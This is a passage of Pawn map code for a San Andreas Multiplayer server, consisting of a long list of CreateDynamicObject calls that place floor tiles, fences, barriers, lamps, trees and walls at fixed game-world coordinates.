	CreateDynamicObject(19372, 1410.60864, -1692.93689, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1692.93689, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1692.93689, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1689.72961, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1689.72961, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1689.72961, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1686.64734, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1686.64734, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1686.64734, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1683.53040, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1683.53040, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1683.53040, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1680.42542, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1680.42542, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1680.42542, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1677.36328, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1677.36328, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1677.36328, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1674.74255, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1674.74255, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1674.74255, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1410.60864, -1672.36023, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1407.12549, -1672.36023, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1403.63550, -1672.36023, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(713, 1408.51270, -1704.99146, 12.11591,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(803, 1409.08289, -1675.61011, 13.42780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14469, 1409.02551, -1673.03186, 12.96729,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1673.17456, 12.96729,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1675.91760, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1678.90002, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1681.80188, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1684.88196, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1687.88330, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52808, -1690.92493, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1693.96545, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1696.94666, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.52454, -1699.94849, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.57471, -1702.78906, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1412.60022, -1705.20898, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1675.91760, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.02551, -1675.91760, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1678.90002, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.02551, -1678.90002, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.00940, -1681.80188, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1681.80188, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1684.88196, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.00940, -1684.88196, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.00940, -1687.88330, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1687.88330, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.00940, -1690.94458, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1690.94458, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.00940, -1693.96545, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1693.96545, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.00940, -1696.94666, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1696.94666, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1408.99426, -1699.96155, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1699.94849, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1408.46741, -1705.04309, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1702.78906, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1404.40051, -1705.20898, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.02478, -1702.80176, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(14469, 1409.02478, -1702.80176, 12.96730,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(3458, 1531.16516, -1754.19995, 14.54950,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(640, 1384.64612, -1652.96802, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1411.52905, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1406.15234, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1400.77551, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1395.39868, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1390.02246, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1384.64612, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3458, 1399.95715, -1642.50830, 14.12655,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1497.33667, -1616.70886, 14.24000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1383.96436, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1388.11841, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1392.27942, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1396.43237, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1400.58960, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1408.87354, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1413.02124, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1417.16882, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1375.66223, -1631.53992, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1371.47681, -1631.54004, 13.00210,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1360.50134, -1631.52356, 13.04610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1364.65308, -1631.52356, 13.04610,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3657, 1378.93237, -1618.51758, 12.95414,   0.00000, 0.00000, 170.48763);
	CreateDynamicObject(3657, 1382.83032, -1626.35083, 12.95414,   0.00000, 0.00000, 352.28754);
	CreateDynamicObject(3657, 1378.76758, -1625.79114, 12.95414,   0.00000, 0.00000, 352.28754);
	CreateDynamicObject(3657, 1383.03552, -1619.21655, 12.95414,   0.00000, 0.00000, 170.48763);
	CreateDynamicObject(3657, 1374.69275, -1617.88892, 12.95414,   0.00000, 0.00000, 170.48763);
	CreateDynamicObject(1594, 1416.65894, -1629.34839, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(970, 1402.67859, -1629.44995, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1215, 1419.11243, -1631.53992, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1406.78772, -1623.30688, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1406.78772, -1629.44995, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1406.78772, -1621.14844, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1215, 1402.67859, -1631.53992, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1402.67859, -1619.01941, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1406.78772, -1619.01941, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1402.67859, -1627.31140, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1402.67859, -1623.30688, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1406.78772, -1627.31140, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 1416.65894, -1621.82568, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1413.22034, -1625.64355, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1409.39990, -1621.82568, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(970, 1402.67859, -1621.14844, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1394.20911, -1621.14844, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1394.20911, -1616.98792, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1394.20911, -1629.44995, 13.00210,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1215, 1394.20911, -1623.30688, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1394.20911, -1627.31140, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1366.77234, -1631.52356, 13.14070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 1409.39990, -1629.34839, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1400.76221, -1629.34839, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1409.39990, -1629.34839, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1409.39990, -1629.34839, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1396.25964, -1629.33301, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1396.25964, -1621.82568, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1594, 1400.76221, -1621.82568, 12.94210,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(1215, 1406.78772, -1631.53992, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13591, 1375.79944, -1602.72107, 12.53746,   0.00000, 0.00000, 8.34000);
	CreateDynamicObject(1215, 1394.20911, -1631.53992, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1215, 1369.33203, -1631.53992, 13.10270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1361.66626, -1618.69934, 13.51140,   0.12000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1366.08081, -1613.68250, 13.88970,   0.12000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1366.79834, -1607.35815, 13.88970,   0.12000, 0.00000, -13.02001);
	CreateDynamicObject(983, 1356.86060, -1618.69934, 13.51140,   0.12000, 0.00000, 90.00000);
	CreateDynamicObject(983, 1365.77734, -1593.65991, 13.47627,   0.12000, 0.00000, 73.85999);
	CreateDynamicObject(1684, 1382.27808, -1684.47888, 14.11890,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1684, 1355.24609, -1668.47668, 14.11890,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19447, 1410.09863, -1716.94604, 8.89043,   0.00000, 0.00000, -5.70000);
	CreateDynamicObject(19447, 1410.09863, -1716.94604, 5.42477,   0.00000, 0.00000, -5.70000);
	CreateDynamicObject(19447, 1411.05261, -1707.39856, 5.42480,   0.00000, 0.00000, -5.70000);
	CreateDynamicObject(19447, 1354.49670, -1684.35071, 10.00630,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19447, 1411.05261, -1707.39856, 8.89040,   0.00000, 0.00000, -5.70000);
	CreateDynamicObject(19447, 1364.11829, -1684.35071, 10.00630,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19447, 1364.11829, -1684.35071, 6.52370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19447, 1354.49670, -1684.35071, 6.52370,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19366, 2812.61792, -2432.83008, 12.26440,   0.00000, 99.00000, 0.00000);
	CreateDynamicObject(19366, 2816.06738, -2432.83008, 11.71720,   0.00000, 99.00000, 0.00000);
	CreateDynamicObject(19366, 2819.50171, -2432.83008, 11.17370,   0.00000, 99.00000, 0.00000);
	CreateDynamicObject(19366, 2819.50171, -2442.91870, 11.17370,   0.00000, 99.00000, 0.00000);
	CreateDynamicObject(19366, 2816.06738, -2442.91870, 11.71720,   0.00000, 99.00000, 0.00000);
	CreateDynamicObject(19366, 2812.61792, -2442.91870, 12.26440,   0.00000, 99.00000, 0.00000);
	CreateDynamicObject(19366, 2812.61792, -2432.83008, 11.18440,   0.00000, 62.00000, 0.00000);
	CreateDynamicObject(19366, 2819.50171, -2432.83008, 10.40079,   0.00000, -55.00000, 0.00000);
	CreateDynamicObject(19366, 2819.50171, -2442.91870, 10.40080,   0.00000, -55.00000, 0.00000);
	CreateDynamicObject(19366, 2812.61792, -2442.91870, 11.18440,   0.00000, 62.00000, 0.00000);
	CreateDynamicObject(3577, 2828.80322, -2443.07275, 11.75680,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2991, 2825.68481, -2428.99438, 11.65787,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2827.71533, -2434.87939, 14.19508,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2825.68481, -2428.99438, 12.89754,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2823.99438, -2446.74585, 11.65790,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2827.71533, -2434.87939, 15.44290,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2823.99438, -2446.74585, 12.89750,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2826.17676, -2446.74585, 11.65790,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2991, 2826.17676, -2446.74585, 12.89750,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3577, 2822.93726, -2429.38672, 11.75680,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1684, 2779.21191, -2433.13330, 14.13950,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 2790.01587, -2434.47241, 13.51550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2991, 2786.43188, -2434.21631, 13.23940,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2991, 2786.43188, -2434.21631, 14.49217,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3577, 2793.16016, -2433.59326, 13.39229,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 2790.01587, -2432.91016, 13.51550,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3630, 2782.06030, -2479.34546, 14.03280,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3630, 2791.54761, -2479.34546, 14.03280,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3630, 2778.86230, -2473.03003, 14.03280,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3630, 2794.79102, -2473.03003, 14.03280,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1684, 2277.90918, -2315.73462, 14.08184,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(12808, 1633.21680, -2164.19824, 15.45631,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13435, 1641.90576, -2166.28540, 13.08495,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1684, 1588.54175, -2171.51733, 14.06310,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3276, 1616.45459, -2180.70703, 13.24520,   0.00000, 0.00000, -49.07994);
	CreateDynamicObject(3276, 1585.98022, -2167.75098, 13.24520,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3276, 1587.06494, -2156.25903, 13.24520,   0.00000, 0.00000, -101.03997);
	CreateDynamicObject(3276, 1590.01477, -2145.05566, 13.24520,   0.00000, 0.00000, -108.60001);
	CreateDynamicObject(3276, 1596.81604, -2136.71851, 13.24520,   0.00000, 0.00000, -149.94000);
	CreateDynamicObject(3276, 1607.58508, -2133.77979, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1619.22986, -2133.77979, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1630.83154, -2133.77979, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1642.43359, -2133.77979, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1658.92175, -2170.57080, 13.24520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3276, 1653.22180, -2176.41919, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1658.92175, -2161.90503, 13.24520,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3276, 1653.12439, -2133.77979, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1641.61682, -2176.41919, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1630.01257, -2176.41919, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1618.39954, -2176.41919, 13.24520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3276, 1585.98022, -2179.36621, 13.24520,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1684, 2670.16431, -1944.91675, 14.07330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1684, 2698.62939, -1944.91675, 14.07330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2066.67236, -1863.66260, 14.23820,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 2675.91382, -1957.09778, 13.25720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2675.73584, -1957.09778, 13.25720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2675.55786, -1957.09778, 13.25720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2675.73584, -1947.47192, 13.25720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 2675.55786, -1947.47192, 13.25720,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16083, 2636.84351, -1961.98047, 17.15440,   0.00000, 0.00000, 170.00000);
	CreateDynamicObject(16083, 2636.84351, -1969.25073, 17.15436,   0.00000, 0.00000, 170.00000);
	CreateDynamicObject(16083, 2636.84351, -1954.95935, 17.15440,   0.00000, 0.00000, 170.00000);
	CreateDynamicObject(16083, 2636.84351, -1947.95593, 17.15440,   0.00000, 0.00000, 170.00000);
	CreateDynamicObject(6288, 394.68158, -1845.19714, 12.22490,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(6283, 382.68970, -1934.97375, 11.89151,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 391.98160, -1956.39441, 7.58340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(996, 401.28131, -1956.89136, 7.28350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(973, 352.28351, -1899.17627, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1910.62964, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1863.40991, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1852.52344, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1841.45911, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1830.65491, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1819.69250, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06769, -1808.88062, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 349.23581, -1919.36340, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 360.06775, -1887.42175, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 356.92569, -1892.21277, 7.54270,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(973, 399.38211, -1885.70801, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 356.75427, -1905.71729, 7.54270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 369.71490, -1915.44958, 7.42209,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(973, 354.77069, -1914.74500, 7.54270,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(973, 349.23581, -1930.41003, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 349.23581, -1941.23962, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 409.88171, -1952.22839, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 354.85538, -1956.39441, 7.58340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(996, 364.10379, -1956.89136, 7.28350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 373.39050, -1956.39441, 7.58340,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(996, 382.69312, -1956.89136, 7.28350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(996, 405.32980, -1956.89136, 7.28350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(973, 349.23581, -1952.22839, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 409.88171, -1941.23962, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 409.88171, -1930.41003, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 409.88171, -1919.36340, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1281, 406.18219, -1932.17078, 10.64767,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1281, 406.17926, -1939.53247, 10.64770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 382.69513, -1945.66516, 7.30391,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 382.69510, -1950.91125, 7.30390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 387.87521, -1950.91125, 7.30390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 392.81519, -1950.91125, 7.30390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 387.87521, -1945.66516, 7.30390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1594, 392.81519, -1945.66516, 7.30390,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(6299, 385.26019, -1902.31934, 8.88000,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(973, 360.06769, -1875.58215, 7.54270,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(973, 410.01599, -1863.40991, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 410.01599, -1852.52344, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 410.01599, -1841.45911, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 410.01599, -1830.65491, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 410.01599, -1819.69250, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 410.01599, -1875.58215, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 399.38211, -1896.93494, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 404.47147, -1879.80359, 7.54270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(973, 399.38211, -1908.03284, 7.54270,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(973, 404.40378, -1914.80493, 7.54270,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1597, 361.01224, -1808.47559, 9.43364,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 361.01221, -1852.50867, 9.43360,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 361.01221, -1830.70422, 9.43360,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 353.00497, -1898.93591, 9.43360,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1597, 361.01221, -1875.63452, 9.43360,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1882.27405, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1814.85010, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1824.15637, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1837.01196, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1845.96179, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1859.10730, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1868.85205, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 361.25980, -1890.63733, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 359.67990, -1893.63708, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(718, 359.67990, -1904.00452, 6.71260,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 361.28030, -1817.77258, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1840.09473, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1821.16162, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1862.39038, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1842.99988, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1884.93567, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1865.27417, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1280, 361.28030, -1887.71680, 7.23500,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1684, 1634.43372, -1717.57373, 13.84390,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1623.18970, -1607.13770, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1628.09338, -1602.41028, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1623.18970, -1616.76038, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1623.18970, -1626.38208, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1623.18970, -1636.00183, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1623.18970, -1645.62268, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1623.18970, -1655.24219, 14.28410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19456, 1628.09338, -1659.97131, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1637.71814, -1602.41028, 14.28410,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19456, 1667.51294, -1602.41028, 14.28410,   0.00000, 0.00000, 90.00000);
